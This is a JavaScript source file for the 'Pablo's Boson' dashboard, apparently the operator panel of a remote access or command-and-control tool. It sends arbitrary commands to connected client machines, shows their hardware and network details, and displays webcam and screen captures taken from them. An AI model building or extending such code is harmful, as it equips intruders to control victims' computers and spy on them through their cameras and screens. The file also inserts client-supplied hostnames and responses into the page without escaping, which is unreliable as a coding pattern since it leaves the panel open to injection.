/**
 * Pablo's Boson - Dashboard JavaScript
 */

// Handle AJAX authentication errors
$(document).ajaxError(function(event, jqXHR, settings, thrownError) {
    if (jqXHR.status === 401) {
        // Redirect to login page if unauthorized
        window.location.href = '/login';
    }
});

// Command handling
$('.command-btn').click(function() {
    const command = $(this).data('command');
    $('#command-input').val(command);
    sendCommand();
});

// Handle Enter key press in command input
$('#command-input').keypress(function(e) {
    if (e.which === 13) {
        sendCommand();
        return false;
    }
});

function sendCommand() {
    const clientId = $('#client-list .active').data('id');
    const command = $('#command-input').val();
    
    if (!clientId) {
        addLogEntry('Please select a client first!', 'error');
        return;
    }

    if (!command) {
        addLogEntry('Please enter a command!', 'error');
        return;
    }

    // Show loading state
    const sendBtn = $('button[onclick="sendCommand()"]');
    const originalBtnHtml = sendBtn.html();
    sendBtn.html('<i class="fas fa-spinner fa-spin"></i> Sending...');
    sendBtn.prop('disabled', true);

    $.post('/command', {
        client_id: clientId,
        command: command
    }, function(data) {
        if (data.status === 'success') {
            addLogEntry(`Command sent to ${clientId}: ${command}`, 'command');
            $('#command-input').val('');
        } else {
            addLogEntry(`Error: ${data.message}`, 'error');
        }
    }).fail(function(xhr) {
        if (xhr.status !== 401) {
            addLogEntry('Failed to send command!', 'error');
        }
    }).always(function() {
        // Restore button state
        sendBtn.html(originalBtnHtml);
        sendBtn.prop('disabled', false);
    });
}

// Client management
function refreshClients() {
    const refreshBtn = $('.refresh-btn i');
    refreshBtn.addClass('fa-spin');
    
    $.get('/clients', function(data) {
        const clientList = $('#client-list');
        const currentActive = clientList.find('.active').data('id');
        
        clientList.empty();
        
        if (data.clients.length === 0) {
            clientList.append(`
                <a href="#" class="list-group-item list-group-item-action disabled">
                    <i class="fas fa-exclamation-circle me-2 text-muted"></i>No clients connected
                </a>
            `);
            return;
        }
        
        data.clients.forEach(client => {
            const item = $(`
                <a href="#" class="list-group-item list-group-item-action">
                    <span class="status-indicator status-online"></span>
                    <strong>${client.hostname}</strong><br>
                    <small class="text-muted">${client.ip}</small>
                </a>
            `);
            
            item.data('id', client.id);
            
            item.click(function() {
                $('#client-list .list-group-item').removeClass('active');
                $(this).addClass('active');
                loadClientInfo(client.id);
            });
            
            clientList.append(item);
            
            // Restore active selection if it still exists
            if (client.id === currentActive) {
                item.addClass('active');
            }
        });
    }).fail(function(xhr) {
        if (xhr.status !== 401) {
            console.error('Failed to refresh clients');
        }
    }).always(function() {
        refreshBtn.removeClass('fa-spin');
    });
}

// Load client system info
function loadClientInfo(clientId) {
    $('#client-info').html(`
        <div class="text-center py-4">
            <i class="fas fa-spinner fa-spin fa-2x mb-3 text-primary"></i>
            <p class="mb-0">Loading client information...</p>
        </div>
    `);
    
    $.get(`/client_info/${clientId}`, function(data) {
        if (data.error) {
            $('#client-info').html(`
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle me-2"></i>${data.error}
                </div>
            `);
            return;
        }
        
        const info = data.system_info;
        
        // Format disk information
        const diskInfo = info.resources.disks.map(d => {
            const usedPercent = ((d.total_gb - d.free_gb) / d.total_gb * 100).toFixed(0);
            const progressClass = usedPercent > 90 ? 'danger' : usedPercent > 70 ? 'warning' : 'success';
            
            return `
                <div class="mb-2">
                    <div class="d-flex justify-content-between mb-1">
                        <small>${d.mountpoint}</small>
                        <small>${d.free_gb}/${d.total_gb} GB free</small>
                    </div>
                    <div class="progress" style="height: 8px;">
                        <div class="progress-bar bg-${progressClass}" role="progressbar" 
                             style="width: ${usedPercent}%" aria-valuenow="${usedPercent}" 
                             aria-valuemin="0" aria-valuemax="100"></div>
                    </div>
                </div>
            `;
        }).join('');
        
        const html = `
            <div class="client-details">
                <div class="text-center mb-3">
                    <i class="fas fa-desktop fa-3x mb-2 text-primary"></i>
                    <h5>${info.basic.hostname}</h5>
                    <span class="badge bg-info">${info.basic.os} ${info.basic.os_version}</span>
                </div>
                
                <div class="row mt-4">
                    <div class="col-6">
                        <p><i class="fas fa-microchip me-2 text-primary"></i><strong>CPU:</strong> ${info.resources.cpu_cores} cores</p>
                    </div>
                    <div class="col-6">
                        <p><i class="fas fa-memory me-2 text-primary"></i><strong>RAM:</strong> ${info.resources.total_ram} GB</p>
                    </div>
                </div>
                
                <p><i class="fas fa-network-wired me-2 text-primary"></i><strong>IP:</strong> ${info.network.ip_address}</p>
                <p><i class="fas fa-fingerprint me-2 text-primary"></i><strong>MAC:</strong> ${info.network.mac_address}</p>
                
                <h6 class="mt-3 mb-2"><i class="fas fa-hdd me-2 text-primary"></i><strong>Storage:</strong></h6>
                ${diskInfo}
            </div>
        `;
        
        $('#client-info').html(html);
    }).fail(function(xhr) {
        if (xhr.status !== 401) {
            $('#client-info').html(`
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle me-2"></i>Failed to load client info!
                </div>
            `);
        }
    });
}

// Response handling
function addLogEntry(message, type = 'response') {
    const timestamp = new Date().toLocaleTimeString();
    let formattedMessage = message;
    
    // Format the message based on type
    if (type === 'command') {
        // For command entries
        if (message.includes('Command sent to')) {
            // Extract client and command
            const parts = message.match(/Command sent to (.*?): (.*)/);
            if (parts && parts.length >= 3) {
                const client = parts[1];
                const command = parts[2];
                formattedMessage = `<strong>Command to <span class="client-name">${client}</span>:</strong> <span class="command-text">${command}</span>`;
            }
        } else {
            formattedMessage = `<strong>System:</strong> ${message}`;
        }
    } else if (type === 'error') {
        // For error entries
        formattedMessage = `<strong>Error:</strong> <span class="error-text">${message}</span>`;
    } else if (type === 'image') {
        // For webcam image entries
        // The message already contains the formatted HTML with the image
        // Just ensure the client name is styled correctly
        if (message.includes('<span class="text-primary">')) {
            const parts = message.split('<br>');
            if (parts.length >= 2) {
                const client = parts[0].replace('<span class="text-primary">', '<span class="client-name">').replace(':</span>', '</span>:');
                const imageContent = parts[1];
                formattedMessage = `${client}<div class="webcam-container">${imageContent}</div>`;
            }
        }
    } else {
        // For response entries
        if (message.includes('<span class="text-primary">')) {
            // Extract client and response
            const parts = message.split('<br>');
            if (parts.length >= 2) {
                const client = parts[0].replace('<span class="text-primary">', '<span class="client-name">').replace(':</span>', '</span>:');
                const response = parts[1];
                
                // Check if response is a command output (contains multiple lines)
                if (response.includes('\n')) {
                    formattedMessage = `${client}<pre>${response}</pre>`;
                } else {
                    formattedMessage = `${client} ${response}`;
                }
            }
        }
    }
    
    const entry = $('<div class="log-entry"></div>')
        .addClass(`log-${type}`)
        .html(`<span class="timestamp">[${timestamp}]</span> ${formattedMessage}`);
    
    $('#response-log').append(entry);
    
    // Limit the number of entries to prevent memory issues
    if ($('#response-log .log-entry').length > 100) {
        $('#response-log .log-entry').first().remove();
    }
    
    // Auto-scroll to bottom
    $('#response-log').scrollTop($('#response-log')[0].scrollHeight);
}

// Auto-refresh responses
setInterval(function() {
    $.get('/responses', function(data) {
        data.responses.forEach(([client, response, command]) => {
            // Special handling for webcam images
            if (command === 'webcam_image') {
                // This is a base64 encoded image
                const imageHtml = `
                    <div class="webcam-image-container">
                        <h5 class="mb-2">Webcam Capture</h5>
                        <img src="data:image/jpeg;base64,${response}" class="img-fluid rounded" alt="Webcam Capture">
                        <div class="mt-2 text-center">
                            <small class="text-muted">Captured at ${new Date().toLocaleTimeString()}</small>
                        </div>
                    </div>
                `;
                addLogEntry(`<span class="text-primary">${client}:</span><br>${imageHtml}`, 'image');
                return;
            }
            
            // Special handling for screenshot images
            if (command === 'screenshot_image') {
                // This is a base64 encoded image
                const imageHtml = `
                    <div class="webcam-image-container">
                        <h5 class="mb-2">Screen Capture</h5>
                        <img src="data:image/jpeg;base64,${response}" class="img-fluid rounded" alt="Screen Capture">
                        <div class="mt-2 text-center">
                            <small class="text-muted">Captured at ${new Date().toLocaleTimeString()}</small>
                        </div>
                    </div>
                `;
                addLogEntry(`<span class="text-primary">${client}:</span><br>${imageHtml}`, 'image');
                return;
            }
            
            // Format the response for better display
            let formattedResponse = response;
            
            // If response contains multiple lines, preserve formatting
            if (response.includes('\n')) {
                formattedResponse = response.replace(/</g, '&lt;').replace(/>/g, '&gt;');
            }
            
            addLogEntry(`<span class="text-primary">${client}:</span><br>${formattedResponse}`, 'response');
        });
    }).fail(function(xhr) {
        if (xhr.status !== 401) {
            console.error('Failed to fetch responses');
        }
    });
}, 2000);

// Initial setup
$(document).ready(function() {
    refreshClients();
    setInterval(refreshClients, 5000);
    
    // Clear the default log entry and add a styled one
    $('#response-log').empty();
    addLogEntry('Terminal initialized. Ready to send commands.', 'command');
});